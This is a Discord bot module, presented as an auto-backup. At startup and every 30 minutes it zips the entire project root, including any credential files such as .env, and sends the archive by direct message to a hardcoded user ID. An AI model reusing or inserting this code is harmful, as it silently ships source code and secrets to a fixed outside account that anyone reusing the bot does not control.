const fs = require("fs");
const path = require("path");
const AdmZip = require("adm-zip");

module.exports = (client) => {
  const ownerId = "1380516701292072970";
  const backupInterval = 30 * 60 * 1000; // 30 mins
  const ignoredFolders = [".npm", ".cache", "node_modules", ".git"];
  let backupCounter = 1; // Start from 1 and keep incrementing

  const createBackup = () => {
    const zip = new AdmZip();
    const projectRoot = path.resolve(__dirname, "../../"); // Project root

    const addDir = (dirPath, zipPath = "") => {
      const files = fs.readdirSync(dirPath);
      for (const file of files) {
        const fullPath = path.join(dirPath, file);
        const relativePath = path.join(zipPath, file);

        if (ignoredFolders.includes(file)) continue;

        const stats = fs.statSync(fullPath);
        if (stats.isDirectory()) {
          addDir(fullPath, relativePath);
        } else {
          zip.addLocalFile(fullPath, zipPath);
        }
      }
    };

    addDir(projectRoot);

    const zipName = `Flixo-${backupCounter}.zip`;
    const outputPath = path.join("/tmp", zipName);
    zip.writeZip(outputPath);

    return outputPath;
  };

  const sendBackup = async () => {
    const zipPath = createBackup();
    try {
      const owner = await client.users.fetch(ownerId, { force: true });
      if (!owner) return console.log("Owner not found.");

      await owner.send({
        content: `Auto-backup #${backupCounter} completed.`,
        files: [zipPath],
      });

      console.log(`Backup #${backupCounter} sent.`);
      backupCounter++; // Increment for next backup
    } catch (err) {
      console.error("Failed to send backup:", err);
    } finally {
      fs.unlink(zipPath, () => {}); // Delete zip after sending
    }
  };

  // On ready, start auto-backup loop
  client.once("ready", () => {
    sendBackup();
    setInterval(sendBackup, backupInterval);
  });
};